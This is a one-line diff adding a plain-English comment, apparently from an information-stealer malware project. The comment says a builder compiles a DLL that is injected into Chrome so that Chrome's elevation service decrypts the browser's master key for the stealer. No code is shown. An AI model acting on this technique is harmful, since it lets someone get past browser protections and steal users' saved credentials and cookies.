@@ -1,0 +1,1 @@
+So pretty much what this file does is this is going to be a dll the builder compiles to inject into the chrome process to make the chrome elevation service believe that the stealers request to decrypt the master key from the local state file is coming from a signed chrome binary so that it accepts the request
